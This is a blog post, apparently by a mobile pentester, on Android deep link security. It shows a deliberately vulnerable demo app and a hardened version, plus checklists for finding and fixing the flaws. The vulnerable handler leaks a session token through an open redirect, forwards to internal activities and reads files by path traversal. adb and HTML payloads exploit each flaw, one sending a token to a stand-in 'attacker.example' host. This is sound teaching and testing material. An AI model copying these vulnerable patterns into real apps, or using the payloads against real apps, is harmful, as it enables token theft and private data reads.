@@ -1,0 +1,457 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <!-- Google Analytics 4 -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-MBD49NHJ0B"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'G-MBD49NHJ0B');
+  </script>
+
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+  <!-- Security headers (best-effort via meta; HSTS/X-Frame-Options need real HTTP headers) -->
+  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline' https://www.googletagmanager.com https://www.google-analytics.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data: https:; connect-src 'self' https://www.google-analytics.com https://*.analytics.google.com https://*.google-analytics.com https://*.googletagmanager.com; base-uri 'self'; form-action 'self' https://api.web3forms.com" />
+  <meta http-equiv="X-Content-Type-Options" content="nosniff" />
+  <meta name="referrer" content="strict-origin-when-cross-origin" />
+
+  <title>Android Deep Links: How They Break, and How to Test Them | Filip Kecman</title>
+  <meta name="description" content="A hands-on breakdown of Android deep link security: a real vulnerable and secure demo app, live adb exploitation, AndroidManifest.xml review, static/dynamic testing methodology, and remediation." />
+  <meta name="robots" content="index, follow" />
+  <link rel="canonical" href="https://kecman.co/blog/android-deep-links-security.html" />
+
+  <meta property="og:type" content="article" />
+  <meta property="og:url" content="https://kecman.co/blog/android-deep-links-security.html" />
+  <meta property="og:title" content="Android Deep Links: How They Break, and How to Test Them" />
+  <meta property="og:description" content="A hands-on breakdown of Android deep link security: a real vulnerable and secure demo app, live adb exploitation, and how to actually test this class of bug." />
+  <meta property="og:image" content="https://kecman.co/filip-kecman.jpg" />
+  <meta property="article:author" content="Filip Kecman" />
+  <meta property="article:published_time" content="2026-07-10" />
+
+  <meta property="article:section" content="Pentesting" />
+  <meta property="article:tag" content="Android" />
+  <meta property="article:tag" content="Mobile Security" />
+  <meta property="article:tag" content="Penetration Testing" />
+  <meta property="article:tag" content="Deep Links" />
+
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "BlogPosting",
+    "headline": "Android Deep Links: How They Break, and How to Test Them",
+    "author": {
+      "@type": "Person",
+      "name": "Filip Kecman",
+      "url": "https://kecman.co"
+    },
+    "datePublished": "2026-07-10",
+    "description": "A hands-on breakdown of Android deep link security: a real vulnerable and secure demo app, live adb exploitation, AndroidManifest.xml review, static/dynamic testing methodology, and remediation.",
+    "publisher": {
+      "@type": "Person",
+      "name": "Filip Kecman"
+    },
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https://kecman.co/blog/android-deep-links-security.html"
+    },
+    "keywords": ["Android deep links", "App Links", "mobile penetration testing", "AndroidManifest.xml security", "intent redirection", "OWASP MASVS"]
+  }
+  </script>
+
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "BreadcrumbList",
+    "itemListElement": [
+      { "@type": "ListItem", "position": 1, "name": "Home", "item": "https://kecman.co/" },
+      { "@type": "ListItem", "position": 2, "name": "Blog", "item": "https://kecman.co/blog.html" },
+      { "@type": "ListItem", "position": 3, "name": "Android Deep Links: How They Break, and How to Test Them" }
+    ]
+  }
+  </script>
+
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&family=Space+Grotesk:wght@400;500;600;700&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="../css/style.css" />
+  <link rel="stylesheet" href="../css/inner.css" />
+  <link rel="icon" href="../favicon.ico" type="image/x-icon" />
+</head>
+<body>
+
+  <!-- NAV -->
+  <nav class="navbar" role="navigation" aria-label="Main navigation">
+    <div class="container">
+      <a href="../index.html" class="nav-logo">Filip Kecman</a>
+      <div class="nav-links" id="navLinks">
+        <a href="../index.html#about">About</a>
+        <a href="../index.html#approach">Approach</a>
+        <a href="../index.html#certifications">Certs</a>
+        <a href="../index.html#research">Research</a>
+        <a href="../index.html#experience">Experience</a>
+        <a href="../index.html#thefreesecurity">TFS</a>
+        <a href="../blog.html" class="active">Blog</a>
+        <a href="../index.html#contact" class="nav-cta">Contact</a>
+      </div>
+      <button class="nav-toggle" id="navToggle" aria-label="Toggle menu" aria-expanded="false">
+        <span></span><span></span><span></span>
+      </button>
+    </div>
+  </nav>
+
+  <!-- BLOG POST -->
+  <article class="blog-post-page">
+    <div class="container">
+      <div class="blog-post-header">
+        <a href="../blog.html" style="font-size:.85rem; color:var(--text-muted); margin-bottom:24px; display:inline-block;">&larr; Back to Blog</a>
+        <h1>Android Deep Links: How They Break, and How to Test Them</h1>
+        <div class="blog-meta">
+          <span class="blog-tag">Pentesting</span>
+          <span>July 10, 2026</span>
+          <span>17 min read</span>
+        </div>
+      </div>
+
+      <div class="blog-post-body">
+        <p>
+          A while ago I was in an interview for an Android pentesting position. I'd done real Android engagements, found real bugs, written real reports. Second question: "Can you explain how deep links work and how they get exploited?" I gave a vague, hand-wavy answer. I got the job anyway, but that question stuck with me, I'd been testing deep links without actually being able to explain them from first principles.
+        </p>
+        <p>
+          So I fixed that properly. I built a small Android project with two real apps, one deliberately vulnerable, one hardened, installed both on an emulator, exploited the vulnerable one with plain <code>adb</code> commands, and confirmed the hardened one blocks the exact same payloads. Every code sample, screenshot, and command below is from that real build, not a hypothetical. This post is the "explain it properly" answer I wish I'd given.
+        </p>
+
+        <h2>What a deep link actually is</h2>
+        <p>
+          A deep link is just a URI that the Android OS routes to a specific screen inside an app instead of (or in addition to) a browser. There are three flavors, and mixing them up is the first thing that trips people up in interviews and in reports:
+        </p>
+        <ul>
+          <li><strong>Custom URI scheme</strong>, e.g. <code>myapp://open?id=42</code>. Any app can register any scheme. There is zero ownership verification: if two apps both declare <code>myapp://</code>, Android just doesn't know which one is "real."</li>
+          <li><strong>Android App Links</strong>, a regular <code>https://</code> URL (e.g. <code>https://example.com/open?id=42</code>) that an app also claims via an intent filter. Because it's a real domain, Android can (optionally) cryptographically verify the app is allowed to handle it, via a file called <code>assetlinks.json</code> hosted on that domain.</li>
+          <li><strong>Plain implicit intents</strong>, not URI-triggered at all, just <code>action.VIEW</code> intents another app constructs and fires directly. Same receiving code, different delivery mechanism, worth remembering when you're deciding whether a fix belongs in the manifest or in the handler code.</li>
+        </ul>
+
+        <p>Every deep link starts life as an <code>&lt;intent-filter&gt;</code> in <code>AndroidManifest.xml</code>:</p>
+<pre><code>&lt;activity android:name=".DeepLinkActivity" android:exported="true"&gt;
+    &lt;intent-filter&gt;
+        &lt;action android:name="android.intent.action.VIEW" /&gt;
+        &lt;category android:name="android.intent.category.DEFAULT" /&gt;
+        &lt;category android:name="android.intent.category.BROWSABLE" /&gt;
+        &lt;data android:scheme="myapp" android:host="open" /&gt;
+    &lt;/intent-filter&gt;
+&lt;/activity&gt;</code></pre>
+        <p>
+          <code>action.VIEW</code> + <code>category.BROWSABLE</code> is what lets a link clicked in a browser or another app actually reach this activity. Drop <code>BROWSABLE</code> and the activity can still be launched via <code>adb</code> or another app's explicit intent, but not from a web page.
+        </p>
+
+        <h2>Who uses deep links, and why</h2>
+        <p>
+          This is the part interviewers actually want to hear, because it's what tells them you understand deep links as a product feature, not just an attack surface:
+        </p>
+        <ul>
+          <li><strong>Push notifications and email/SMS campaigns</strong>,"View your order" opens the exact order screen instead of the app's home screen.</li>
+          <li><strong>OAuth / SSO redirect-back</strong>, after authenticating in a browser or another app, the identity provider redirects back into your app via a deep link carrying an auth code or token.</li>
+          <li><strong>Payment / 3-D Secure return flows</strong>, the bank's page finishes and deep-links back into the app to resume the checkout.</li>
+          <li><strong>Referral and attribution SDKs</strong>, Branch, AppsFlyer, Adjust, and similar all work by intercepting a deep link, resolving it against a server, and forwarding params into the app.</li>
+          <li><strong>"Open in app" banners and universal links</strong>, the same URL that works as a normal web page opens the app instead if it's installed.</li>
+        </ul>
+        <p>
+          Notice the pattern: the two riskiest use cases (SSO handoff, payment return) are exactly the ones that pass authentication material through the deep link. That's not a coincidence, it's why deep link bugs so often turn into account takeover rather than "just" a UI quirk.
+        </p>
+
+        <h2>How Android resolves a deep link</h2>
+        <p>
+          For a <strong>custom scheme</strong>, resolution is a free-for-all: whichever installed app declares a matching <code>&lt;data&gt;</code> block is a candidate. If exactly one app matches, Android opens it directly. If more than one app registers the same scheme, the user gets a disambiguation chooser, or, if a malicious app is set as the default handler, it can just win silently.
+        </p>
+        <p>
+          For <strong>App Links</strong>, Android can additionally verify domain ownership. This only happens when the intent filter has <code>android:autoVerify="true"</code> <em>and</em> the domain serves a reachable <code>/.well-known/assetlinks.json</code> listing the app's signing certificate SHA-256 fingerprint. If both conditions hold, Android grants the app exclusive, silent handling of that domain, no chooser, no other app can intercept it. If either condition is missing, the OS falls back to legacy behavior: a disambiguation dialog, or in some configurations, whichever app the user happens to have set as default.
+        </p>
+        <p>
+          This is the single most common misunderstanding I see in the field: teams add <code>android:autoVerify="true"</code> to the manifest and consider App Links "secured," without ever hosting <code>assetlinks.json</code>. The attribute alone does nothing, verification either succeeds against a real hosted file, or it silently fails and you're back to unverified custom-scheme-like behavior.
+        </p>
+
+        <h2>The demo: a real vulnerable app and a real hardened app</h2>
+        <p>
+          I built two small Kotlin apps, <code>app-vulnerable</code> and <code>app-secure</code>, sharing the identical manifest shape: a launcher activity, an exported <code>DeepLinkActivity</code> reachable via <code>vulnapp://open</code> and via an unverified <code>https://deeplink-demo.kecman.co/open</code> App Link, and a non-exported "internal" <code>AdminActivity</code> meant to simulate a privileged screen. Both were built with Gradle, installed on an Android 11 emulator, and exploited with nothing more than <code>adb shell am start</code>.
+        </p>
+        <p>
+          <code>DeepLinkActivity</code> reads three query parameters straight off <code>intent.data</code>, <code>next</code>, <code>target</code>, and <code>file</code>, each one feeding a classic, real-world sink. Here's the vulnerable version, unedited:
+        </p>
+<pre><code>class DeepLinkActivity : AppCompatActivity() {
+
+    private val sessionToken = "eyJhbGciOiJIUzI1NiJ9.DEMOTOKEN123.fakejwtsignature"
+
+    private fun handleIntent(intent: Intent) {
+        val uri = intent.data ?: return
+
+        // VULN 1: open redirect + session token leak via WebView
+        val next = uri.getQueryParameter("next")
+        if (next != null) {
+            val finalUrl = "$next?session=$sessionToken"
+            webView.loadUrl(finalUrl)
+        }
+
+        // VULN 2: intent redirection to a non-exported activity
+        val targetClass = uri.getQueryParameter("target")
+        if (targetClass != null) {
+            val forward = Intent().setClassName(this, targetClass)
+            startActivity(forward)
+        }
+
+        // VULN 3: path traversal / arbitrary internal file read
+        val fileName = uri.getQueryParameter("file")
+        if (fileName != null) {
+            val target = File(filesDir, fileName)
+            val content = target.readText()
+            resultText.text = content
+        }
+    }
+}</code></pre>
+        <p>
+          None of these three lines of logic are contrived, each one mirrors a pattern I've genuinely seen in production apps. Let's exploit each one.
+        </p>
+
+        <h3>1. Open redirect + token leak</h3>
+        <p>
+          The <code>next</code> parameter is loaded into a <code>WebView</code> with zero host or scheme validation, and the app happily glues its own session token onto the URL first, exactly the kind of shortcut a "continue after login" deep link handler takes when someone forgot the redirect target is attacker-controlled.
+        </p>
+<pre><code>adb shell am start -W -a android.intent.action.VIEW \
+  -d "vulnapp://open?next=https://attacker.example/steal" \
+  co.kecman.deeplinkdemo.vulnerable</code></pre>
+        <p>The WebView resolves and requests the attacker URL with the token attached, in full view on-screen and in logcat:</p>
+        <figure style="text-align:center; margin: 32px 0;">
+          <img src="../android-deeplink-vuln-redirect.png" alt="Vulnerable app loading an attacker URL with the session token attached in the query string" style="max-width: 100%; border-radius: 8px;" loading="lazy" />
+        </figure>
+<pre><code>D DeepLinkDemo: VULN1 open-redirect: loading WebView URL with session
+token attached: https://attacker.example/steal?session=eyJhbGciOiJIUzI1
+NiJ9.DEMOTOKEN123.fakejwtsignature</code></pre>
+        <p>
+          In a real app, that <code>attacker.example</code> server just received the victim's live session token as a plain GET parameter, account takeover, no phishing page required, just one tapped link.
+        </p>
+
+        <h3>2. Intent redirection / confused deputy</h3>
+        <p>
+          <code>AdminActivity</code> is declared <code>android:exported="false"</code>, which should make it completely unreachable from outside the app. But <code>DeepLinkActivity</code> (exported) takes an attacker-supplied class name and forwards to it with no allowlist, a textbook confused deputy, reopening a surface the manifest tried to close.
+        </p>
+<pre><code>adb shell am start -W -a android.intent.action.VIEW \
+  -d "vulnapp://open?target=co.kecman.deeplinkdemo.vulnerable.AdminActivity" \
+  co.kecman.deeplinkdemo.vulnerable</code></pre>
+        <figure style="text-align:center; margin: 32px 0;">
+          <img src="../android-deeplink-vuln-admin.png" alt="Deep link reaching a non-exported AdminActivity via intent redirection" style="max-width: 100%; border-radius: 8px;" loading="lazy" />
+        </figure>
+        <p>
+          The internal-only screen renders, reached entirely through the exported activity's forwarding logic. <code>android:exported="false"</code> only protects the component from <em>direct</em> external intents, it says nothing about code inside your own app that turns untrusted input into a component to launch.
+        </p>
+
+        <h3>3. Path traversal / arbitrary internal file read</h3>
+        <p>
+          The <code>file</code> parameter is appended to <code>filesDir</code> with no canonicalization, so <code>../</code> sequences escape the intended directory and reach sibling files, in this case, the app's own <code>SharedPreferences</code> XML, seeded with a fake auth token to make the leak concrete.
+        </p>
+<pre><code>adb shell am start -W -a android.intent.action.VIEW \
+  -d "vulnapp://open?file=../shared_prefs/co.kecman.deeplinkdemo.vulnerable_preferences.xml" \
+  co.kecman.deeplinkdemo.vulnerable</code></pre>
+        <figure style="text-align:center; margin: 32px 0;">
+          <img src="../android-deeplink-vuln-traversal.png" alt="Path traversal via a deep link file parameter leaking SharedPreferences containing an auth token" style="max-width: 100%; border-radius: 8px;" loading="lazy" />
+        </figure>
+        <p>
+          <code>auth_token=SUPER_SECRET_AUTH_TOKEN_abc123</code>, read straight out of app-private storage via a link. Swap the target path for a SQLite database under <code>databases/</code> and the same bug reads session tables, cached PII, or cookie jars.
+        </p>
+
+        <h2>The same three payloads against the hardened app</h2>
+        <p>
+          <code>app-secure</code> exposes the identical entry points and the identical three query parameters. The only difference is validation before each sink:
+        </p>
+<pre><code>class DeepLinkActivity : AppCompatActivity() {
+
+    private val allowedRedirectHosts = setOf(
+        "deeplink-demo.kecman.co", "trusted-partner.example"
+    )
+
+    // No session token constant at all -- the real fix isn't allowlisting
+    // the host, it's never putting tokens in redirect URLs in the first place.
+    private val forwardableActivities: Map&lt;String, Class&lt;*&gt;&gt; = mapOf(
+        "main" to MainActivity::class.java
+    )
+
+    private fun handleIntent(intent: Intent) {
+        val uri = intent.data ?: return
+
+        val next = uri.getQueryParameter("next")
+        if (next != null) {
+            if (isAllowedRedirect(next)) webView.loadUrl(next)
+            else showBlocked("'$next' is not an allowlisted https redirect target.")
+        }
+
+        val targetKey = uri.getQueryParameter("target")
+        if (targetKey != null) {
+            val activityClass = forwardableActivities[targetKey]
+            if (activityClass != null) startActivity(Intent(this, activityClass))
+            else showBlocked("'$targetKey' is not a whitelisted forward target.")
+        }
+
+        val fileName = uri.getQueryParameter("file")
+        if (fileName != null) {
+            val target = File(filesDir, fileName)
+            val canonicalTarget = target.canonicalPath
+            val canonicalFilesDir = filesDir.canonicalPath + File.separator
+            if (canonicalTarget.startsWith(canonicalFilesDir)) resultText.text = target.readText()
+            else showBlocked("'$fileName' resolves outside the app's files directory.")
+        }
+    }
+
+    private fun isAllowedRedirect(next: String): Boolean {
+        val parsed = Uri.parse(next)
+        return parsed.scheme == "https" && allowedRedirectHosts.contains(parsed.host)
+    }
+}</code></pre>
+        <p>Replaying the exact same three payloads against this build:</p>
+
+        <div style="display:grid; grid-template-columns: 1fr 1fr 1fr; gap:16px; margin: 24px 0;">
+          <figure style="text-align:center; margin:0;">
+            <img src="../android-deeplink-secure-redirect.png" alt="Secure app blocking the open redirect payload" style="max-width: 100%; border-radius: 8px;" loading="lazy" />
+            <figcaption style="font-size:.8rem; color:var(--text-muted); margin-top:6px;">Redirect blocked</figcaption>
+          </figure>
+          <figure style="text-align:center; margin:0;">
+            <img src="../android-deeplink-secure-admin.png" alt="Secure app blocking the intent redirection payload" style="max-width: 100%; border-radius: 8px;" loading="lazy" />
+            <figcaption style="font-size:.8rem; color:var(--text-muted); margin-top:6px;">Forward blocked</figcaption>
+          </figure>
+          <figure style="text-align:center; margin:0;">
+            <img src="../android-deeplink-secure-traversal.png" alt="Secure app blocking the path traversal payload" style="max-width: 100%; border-radius: 8px;" loading="lazy" />
+            <figcaption style="font-size:.8rem; color:var(--text-muted); margin-top:6px;">Traversal blocked</figcaption>
+          </figure>
+        </div>
+        <p>
+          Same links, same emulator, same package structure, the only variable that changed is validation logic. That's usually the honest answer to "how do you fix a deep link vuln": you almost never remove the feature, you add an allowlist and stop trusting the URI.
+        </p>
+
+        <h2>A fourth pitfall: unverified App Links</h2>
+        <p>
+          Both demo apps also declare the HTTPS App Link <code>https://deeplink-demo.kecman.co/open</code>. The secure manifest sets <code>android:autoVerify="true"</code>; the vulnerable one doesn't. Because I don't actually own <code>deeplink-demo.kecman.co</code>, there's no real <code>assetlinks.json</code> to serve, so verification fails on both, which is itself the point worth internalizing:
+        </p>
+<pre><code>$ adb shell dumpsys package domain-preferred-apps   (filtered to app-secure)
+  Package: co.kecman.deeplinkdemo.secure
+  Domains: deeplink-demo.kecman.co
+  Status:  ask</code></pre>
+        <p>
+          <code>autoVerify="true"</code> plus a missing or unreachable <code>assetlinks.json</code> gives you <code>Status: ask</code>, the same fallback disambiguation behavior as never setting <code>autoVerify</code> at all. (On Android 12+ the equivalent check is <code>adb shell pm get-app-links &lt;package&gt;</code>; this demo ran on an Android 11 emulator where that specific subcommand doesn't exist yet, hence <code>dumpsys package domain-preferred-apps</code> above.) The manifest attribute is necessary but nowhere near sufficient, if you're reviewing an app's App Links setup, the manifest tells you intent, not outcome. You have to check the live verification status and confirm the hosted <code>assetlinks.json</code> actually matches the app's signing certificate.
+        </p>
+
+        <h2>Static analysis: what to actually look for</h2>
+        <p>When you get an APK, this is the fast path to finding deep link attack surface before you touch a decompiler:</p>
+        <p><strong>In <code>AndroidManifest.xml</code></strong> (via <code>aapt dump xmltree &lt;apk&gt; AndroidManifest.xml</code> or jadx's manifest view):</p>
+        <ul>
+          <li>Every <code>&lt;activity&gt;</code> with an <code>&lt;intent-filter&gt;</code> containing <code>action.VIEW</code> + <code>category.BROWSABLE</code>, this is your full list of deep-link entry points.</li>
+          <li><code>android:exported</code> on each, on targetSdk 31+ this must be explicit; a missing value on an older targetSdk defaults to exported if an intent-filter is present, a detail worth checking against the actual <code>targetSdkVersion</code>.</li>
+          <li>Presence or absence of <code>android:autoVerify="true"</code> on any <code>https</code> data block, and whether <code>pathPrefix</code>/<code>pathPattern</code> is broad enough to be meaningfully restrictive.</li>
+          <li>Multiple hosts or multiple apps claiming the same custom scheme, install two apps with the same scheme on a test device and see who wins.</li>
+        </ul>
+        <p><strong>In the decompiled code</strong> (jadx), grep for <code>getIntent().getData()</code> and trace every value pulled off that <code>Uri</code> to its sink:</p>
+<pre><code>Uri uri = getIntent().getData();
+String token = uri.getQueryParameter("token");
+String next  = uri.getQueryParameter("next");
+
+webView.loadUrl(uri.getQueryParameter("url"));          // WebView load -&gt; JS injection, token theft
+System.load(uri.getQueryParameter("lib"));               // native lib load -&gt; RCE-class bug
+new FileInputStream(uri.getQueryParameter("file"));       // path traversal
+startActivity(new Intent(uri.getQueryParameter("redirect"))); // intent redirection</code></pre>
+        <p>
+          Each of those four sinks is a real vulnerability class on its own; the demo above covers the first, third, and fourth, but the <code>System.load</code> variant deserves a special mention: a deep link that controls a path handed to <code>System.load()</code> or <code>loadLibrary()</code> lets an attacker host a malicious <code>.so</code> on their own server and have the victim app <code>dlopen()</code> it, executing <code>JNI_OnLoad</code> in the app's own process, full native code execution, delivered by a single tapped link.
+        </p>
+
+        <h2>Dynamic testing methodology</h2>
+        <p>The whole point of this demo is that none of it needed anything beyond stock Android tooling:</p>
+<pre><code># Trigger a deep link directly
+adb shell am start -W -a android.intent.action.VIEW -d "myapp://open?param=value"
+
+# Same, forcing a specific package when multiple apps share a scheme
+adb shell am start -W -a android.intent.action.VIEW -d "myapp://open?param=value" com.target.package
+
+# Check App Link verification status (Android 12+)
+adb shell pm get-app-links com.target.package
+
+# Android 11 and earlier equivalent
+adb shell dumpsys package domain-preferred-apps
+
+# Watch what the app does with the parsed URI in real time
+adb logcat | grep -i deeplink</code></pre>
+        <p>
+          For the one-click, no-adb-required version of the redirect PoC, a minimal HTML page is enough to prove the same bug fires from a real browser tap:
+        </p>
+<pre><code>&lt;a href="myapp://open?next=https://attacker.example/steal"&gt;Click to view your order&lt;/a&gt;</code></pre>
+        <p>
+          Beyond adb, a Frida hook on <code>Activity.onCreate</code> / <code>getIntent()</code> lets you fuzz every query parameter without rebuilding anything, and is the right move once static analysis has told you where the interesting sinks are but you want to observe live values or bypass an obfuscated parameter name. For the referrer-check variant some apps use, <code>--ez android.intent.extra.REFERRER</code> lets you spoof the launching package in the <code>am start</code> command.
+        </p>
+
+        <h2>Detection checklist</h2>
+        <ol>
+          <li>Enumerate every exported activity with <code>action.VIEW</code> + <code>category.BROWSABLE</code> from the manifest.</li>
+          <li>For each, identify every query parameter the code reads off <code>intent.data</code>.</li>
+          <li>Trace each parameter to its sink: WebView load, <code>startActivity</code>/reflection, file I/O, native lib load, or forwarded to another intent.</li>
+          <li>For each sink, ask: is this value validated against an allowlist, or trusted as-is?</li>
+          <li>For HTTPS App Links, confirm <code>autoVerify</code> is set <em>and</em> check the live verification status with <code>pm get-app-links</code>, don't just read the manifest.</li>
+          <li>Check for scheme collisions: does any other installed app register the same custom scheme?</li>
+        </ol>
+
+        <h2>Remediation checklist</h2>
+        <ul>
+          <li><strong>Allowlist, don't sanitize.</strong> Validate redirect hosts and schemes against a fixed set; reject anything else outright.</li>
+          <li><strong>Never carry session tokens in a URL</strong>, redirect or otherwise, allowlisted or not, URLs end up in logs, browser history, and Referer headers.</li>
+          <li><strong>Never turn user input into a class name or component reference.</strong> Use an explicit whitelist map from a known key to a known <code>Class</code>, exactly like the fix above.</li>
+          <li><strong>Canonicalize file paths</strong> and verify the resolved path is still inside the intended directory before touching the filesystem.</li>
+          <li><strong>Set <code>android:autoVerify="true"</code> and actually host <code>assetlinks.json</code></strong> with the correct signing certificate fingerprint, then confirm with <code>pm get-app-links</code>, don't assume.</li>
+          <li><strong>Treat every deep link parameter as untrusted external input</strong>, the same way you'd treat a query string on a public HTTP endpoint, because functionally, that's exactly what it is.</li>
+        </ul>
+
+        <h2>OWASP MASVS mapping</h2>
+        <p>
+          For report writing: deep link vulnerabilities generally map to OWASP Mobile Top 10 (2024) <strong>M3</strong> (insecure authentication/authorization, when a token or auth flow is involved) and <strong>M4</strong> (input validation, for the redirection/traversal/forwarding sinks), with test cases under <strong>MSTG-PLATFORM-3</strong> in the Mobile Application Security Testing Guide.
+        </p>
+
+        <h2>Closing</h2>
+        <p>
+          If I get that interview question again, the answer is short: deep links are just URIs the OS routes into an app, they come in custom-scheme and verified-App-Link flavors with very different trust guarantees, and almost every real vulnerability is the same root cause, a query parameter treated as trusted input when it's actually attacker-controlled. Building the vulnerable and secure versions side by side, and actually exploiting both with nothing but <code>adb</code>, made that concrete in a way that reading about it never did.
+        </p>
+        <p>
+          Thanks for reading! You can add me on <a href="https://www.linkedin.com/in/filip-kecman/" target="_blank" rel="noopener">LinkedIn</a>.
+        </p>
+        <p>Happy Hacking!</p>
+      </div>
+      <section class="related-posts" aria-labelledby="related-title">
+        <div class="related-header"><h2 id="related-title">Recommended reading</h2><a href="../blog.html">View all articles &rarr;</a></div>
+        <div class="related-grid">
+        <a class="related-card" href="claude-code-usage-optimization.html">
+          <div class="blog-meta"><span class="blog-tag">Tools</span><span>2026-04-29</span><span>8 min read</span></div>
+          <h3>How I Built a Self-Improving Claude Code Setup Using ccusage and a Weekly Reflection Loop</h3>
+          <span class="read-more">Read article &rarr;</span>
+        </a>
+        <a class="related-card" href="ccpenx-aws-review-experience.html">
+          <div class="blog-meta"><span class="blog-tag">Career</span><span>2026-04-24</span><span>5 min read</span></div>
+          <h3>My CCPenX-AWS Review &amp; Experience</h3>
+          <span class="read-more">Read article &rarr;</span>
+        </a>
+        <a class="related-card" href="axios-supply-chain-attack.html">
+          <div class="blog-meta"><span class="blog-tag">Pentesting</span><span>2026-03-31</span><span>13 min read</span></div>
+          <h3>Supply Chain Attacks in Modern Software Development: The Axios Incident</h3>
+          <span class="read-more">Read article &rarr;</span>
+        </a>
+        </div>
+      </section>
+    </div>
+  </article>
+
+  <!-- FOOTER -->
+  <footer class="footer">
+    <div class="container">
+      <span class="footer-text">&copy; 2026 Filip Kecman. All rights reserved.</span>
+      <div class="footer-links">
+        <a href="https://www.linkedin.com/in/filip-kecman/" target="_blank" rel="noopener">LinkedIn</a>
+        <a href="https://thefreesecurity.com" target="_blank" rel="noopener">The Free Security</a>
+      </div>
+    </div>
+  </footer>
+
+  <script src="../js/main.js"></script>
+</body>
+</html>
